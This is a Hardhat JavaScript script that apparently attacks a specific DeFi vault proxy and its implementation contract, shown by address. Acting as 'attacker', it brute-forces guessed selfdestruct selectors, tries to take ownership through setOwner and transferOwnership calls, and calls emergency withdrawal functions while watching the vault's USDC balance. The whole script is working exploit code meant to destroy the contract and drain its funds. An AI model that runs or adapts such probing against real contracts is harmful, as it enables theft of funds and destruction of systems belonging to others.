const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const IMPLEMENTATION_ADDRESS = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title SELFDESTRUCT Analyzer
 * @notice Analyze and potentially trigger the SELFDESTRUCT mechanism
 * @dev The implementation contains SELFDESTRUCT at position 84
 */
async function main() {
  console.log("\nðŸ’£ SELFDESTRUCT MECHANISM ANALYSIS");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  // Get implementation bytecode
  const implCode = await ethers.provider.getCode(IMPLEMENTATION_ADDRESS);
  console.log("Implementation bytecode length:", implCode.length / 2 - 1, "bytes");
  
  // Analyze SELFDESTRUCT pattern
  console.log("\nðŸ” Analyzing SELFDESTRUCT conditions...");
  
  // SELFDESTRUCT opcode is 0xff
  const selfdestructIndex = implCode.indexOf("ff");
  console.log("SELFDESTRUCT found at byte position:", selfdestructIndex / 2);
  
  // Get context around SELFDESTRUCT
  const contextStart = Math.max(0, selfdestructIndex - 40);
  const contextEnd = Math.min(implCode.length, selfdestructIndex + 40);
  const context = implCode.substring(contextStart, contextEnd);
  console.log("Context:", context);
  
  // Common SELFDESTRUCT patterns
  console.log("\nðŸ§ª Testing SELFDESTRUCT triggers:");
  
  // Pattern 1: Direct call to implementation
  console.log("\n1ï¸âƒ£ Direct implementation call:");
  try {
    const tx1 = await attacker.sendTransaction({
      to: IMPLEMENTATION_ADDRESS,
      data: "0x",
      gasLimit: 100000
    });
    await tx1.wait();
    console.log("âœ… Direct call executed");
  } catch (e) {
    console.log("âŒ Direct call failed:", extractError(e));
  }
  
  // Pattern 2: Common SELFDESTRUCT function signatures
  const destructSignatures = [
    "0x83197ef0", // destroy()
    "0x9cb8a26a", // selfDestruct()
    "0x00f55d9d", // kill(address)
    "0x41c0e1b5", // kill()
    "0x8fc866da", // destruct()
    "0x35f46994", // destroy(address)
  ];
  
  for (const sig of destructSignatures) {
    console.log(`\n2ï¸âƒ£ Testing ${sig}:`);
    
    // Try on implementation
    try {
      const implTx = await attacker.sendTransaction({
        to: IMPLEMENTATION_ADDRESS,
        data: sig,
        gasLimit: 100000
      });
      await implTx.wait();
      console.log("âœ… Implementation call succeeded");
      
      // Check if destroyed
      const newCode = await ethers.provider.getCode(IMPLEMENTATION_ADDRESS);
      if (newCode === "0x") {
        console.log("ðŸ’¥ IMPLEMENTATION DESTROYED!");
      }
    } catch (e) {
      console.log("âŒ Implementation call failed");
    }
    
    // Try on vault via delegatecall
    try {
      const vaultTx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: sig,
        gasLimit: 100000
      });
      await vaultTx.wait();
      console.log("âœ… Vault call succeeded");
    } catch (e) {
      console.log("âŒ Vault call failed");
    }
  }
  
  // Pattern 3: Admin/Owner triggered SELFDESTRUCT
  console.log("\n3ï¸âƒ£ Admin-triggered SELFDESTRUCT:");
  
  // First try to become owner/admin
  const ownerFunctions = [
    { sig: "0x13af4035", name: "setOwner(address)" },
    { sig: "0xf2fde38b", name: "transferOwnership(address)" },
    { sig: "0xc7c4ff46", name: "setAdmin(address)" },
    { sig: "0x7a9e5e4b", name: "setAuthority(address)" }
  ];
  
  for (const func of ownerFunctions) {
    try {
      const data = func.sig + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [attacker.address]
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
      await tx.wait();
      console.log(`âœ… ${func.name} succeeded`);
    } catch (e) {
      // Silent
    }
  }
  
  // Now try SELFDESTRUCT as potential admin
  for (const sig of destructSignatures) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: sig + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address"],
          [attacker.address]
        ).slice(2),
        gasLimit: 200000
      });
      await tx.wait();
      console.log(`âœ… Admin SELFDESTRUCT ${sig} executed`);
    } catch (e) {
      // Silent
    }
  }
  
  // Pattern 4: Emergency functions that might trigger SELFDESTRUCT
  console.log("\n4ï¸âƒ£ Emergency functions:");
  
  const emergencyFunctions = [
    "0xdb2e21bc", // emergencyExit()
    "0x5312ea8e", // emergencyWithdraw(uint256)
    "0x01681a62", // emergencyWithdraw(address)
    "0x5fd8c710", // withdrawETH()
    "0xf14210a6", // withdrawETH(uint256)
  ];
  
  for (const sig of emergencyFunctions) {
    try {
      // Try with USDC address parameter
      const data1 = sig + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [USDC_ADDRESS]
      ).slice(2);
      
      const tx1 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data1,
        gasLimit: 300000
      });
      await tx1.wait();
      console.log(`âœ… ${sig} with USDC address executed`);
      
      // Check balances
      const vaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
      console.log("Vault USDC:", ethers.formatUnits(vaultUSDC, 6));
      
    } catch (e) {
      // Silent
    }
  }
  
  // Check final state
  console.log("\nðŸ“Š Final State Check:");
  
  const finalImplCode = await ethers.provider.getCode(IMPLEMENTATION_ADDRESS);
  const finalVaultCode = await ethers.provider.getCode(VAULT_ADDRESS);
  
  console.log("Implementation still exists:", finalImplCode !== "0x");
  console.log("Vault still exists:", finalVaultCode !== "0x");
  
  const finalUSDC = await USDC.balanceOf(VAULT_ADDRESS);
  console.log("Final vault USDC:", ethers.formatUnits(finalUSDC, 6));
  
  if (finalImplCode === "0x") {
    console.log("\nðŸ’¥ SUCCESS: Implementation was destroyed!");
    console.log("This may have transferred funds to the SELFDESTRUCT beneficiary");
  }
}

function extractError(e) {
  if (e.reason) return e.reason;
  if (e.message) {
    const match = e.message.match(/reason="([^"]+)"/);
    if (match) return match[1];
  }
  return "Unknown error";
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
